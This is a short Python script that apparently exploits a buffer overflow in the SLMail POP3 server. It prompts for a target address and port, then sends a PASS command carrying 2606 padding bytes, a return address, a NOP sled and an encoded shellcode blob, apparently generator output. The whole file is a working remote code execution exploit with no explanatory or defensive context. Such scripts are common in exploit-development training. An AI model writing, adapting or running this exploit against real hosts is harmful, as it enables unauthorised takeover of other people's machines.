#!/usr/bin/python3

from time import sleep
import sys,socket

print("**********SLMAIL POP3 vulnerability**********")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter the Port number:\n")

if(len(ip_address)<=0) or (len(port_number)<=0):
    if(len(ip_address)>0) and (len(port_number)<=0):
        print("*"*25)
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0):
        print("*"*25)
        print("IP addres field is empty")
    else:
        print("*"*25)
        print("Issues with the user input")

elif(len(ip_address)>0) and (len(port_number)>0):
    print("*"*25)
    buf =  b""
    buf += b"\xd9\xcb\xbd\xb0\xab\x4d\xe3\xd9\x74\x24\xf4\x58"
    buf += b"\x2b\xc9\xb1\x52\x31\x68\x17\x03\x68\x17\x83\x70"
    buf += b"\xaf\xaf\x16\x8c\x58\xad\xd9\x6c\x99\xd2\x50\x89"
    buf += b"\xa8\xd2\x07\xda\x9b\xe2\x4c\x8e\x17\x88\x01\x3a"
    buf += b"\xa3\xfc\x8d\x4d\x04\x4a\xe8\x60\x95\xe7\xc8\xe3"
    buf += b"\x15\xfa\x1c\xc3\x24\x35\x51\x02\x60\x28\x98\x56"
    buf += b"\x39\x26\x0f\x46\x4e\x72\x8c\xed\x1c\x92\x94\x12"
    buf += b"\xd4\x95\xb5\x85\x6e\xcc\x15\x24\xa2\x64\x1c\x3e"
    buf += b"\xa7\x41\xd6\xb5\x13\x3d\xe9\x1f\x6a\xbe\x46\x5e"
    buf += b"\x42\x4d\x96\xa7\x65\xae\xed\xd1\x95\x53\xf6\x26"
    buf += b"\xe7\x8f\x73\xbc\x4f\x5b\x23\x18\x71\x88\xb2\xeb"
    buf += b"\x7d\x65\xb0\xb3\x61\x78\x15\xc8\x9e\xf1\x98\x1e"
    buf += b"\x17\x41\xbf\xba\x73\x11\xde\x9b\xd9\xf4\xdf\xfb"
    buf += b"\x81\xa9\x45\x70\x2f\xbd\xf7\xdb\x38\x72\x3a\xe3"
    buf += b"\xb8\x1c\x4d\x90\x8a\x83\xe5\x3e\xa7\x4c\x20\xb9"
    buf += b"\xc8\x66\x94\x55\x37\x89\xe5\x7c\xfc\xdd\xb5\x16"
    buf += b"\xd5\x5d\x5e\xe6\xda\x8b\xf1\xb6\x74\x64\xb2\x66"
    buf += b"\x35\xd4\x5a\x6c\xba\x0b\x7a\x8f\x10\x24\x11\x6a"
    buf += b"\xf3\x8b\x4e\x10\xd0\x64\x8d\xd8\xd5\x86\x18\x3e"
    buf += b"\xb3\x76\x4d\xe9\x2c\xee\xd4\x61\xcc\xef\xc2\x0c"
    buf += b"\xce\x64\xe1\xf1\x81\x8c\x8c\xe1\x76\x7d\xdb\x5b"
    buf += b"\xd0\x82\xf1\xf3\xbe\x11\x9e\x03\xc8\x09\x09\x54"
    buf += b"\x9d\xfc\x40\x30\x33\xa6\xfa\x26\xce\x3e\xc4\xe2"
    buf += b"\x15\x83\xcb\xeb\xd8\xbf\xef\xfb\x24\x3f\xb4\xaf"
    buf += b"\xf8\x16\x62\x19\xbf\xc0\xc4\xf3\x69\xbe\x8e\x93"
    buf += b"\xec\x8c\x10\xe5\xf0\xd8\xe6\x09\x40\xb5\xbe\x36"
    buf += b"\x6d\x51\x37\x4f\x93\xc1\xb8\x9a\x17\xe1\x5a\x0e"
    buf += b"\x62\x8a\xc2\xdb\xcf\xd7\xf4\x36\x13\xee\x76\xb2"
    buf += b"\xec\x15\x66\xb7\xe9\x52\x20\x24\x80\xcb\xc5\x4a"
    buf += b"\x37\xeb\xcf"
    buffer=b"A" * 2606 + b"\x8f\x35\x4a\x5f" + b"\x90" * 16 + buf 
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((ip_address, int(port_number)))
    s.send((b"USER TEST\r\n"))
    s.send((b"PASS " + buffer + b"\r\n"))
    s.close()
